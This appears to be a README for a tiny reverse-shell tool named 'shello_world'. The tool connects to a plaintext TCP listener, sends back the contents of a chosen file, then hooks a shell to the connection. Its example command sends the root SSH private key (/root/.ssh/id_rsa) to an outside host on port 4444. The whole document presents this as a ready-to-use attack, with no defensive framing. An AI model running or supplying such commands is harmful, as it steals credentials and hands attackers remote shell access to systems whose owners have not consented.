Shello, World!
==============
A very simple reverse shell, almost `Hello, World!` simple.  It connects to
plaintext TCP listener (e.g. netcat), sends the contents of a file back, and
then hooks up a shell to the connection.

Usage
-----
```sh
./shello_world addr:port filename
```

### Example
```sh
./shello_world example.com:4444 /root/.ssh/id_rsa
```
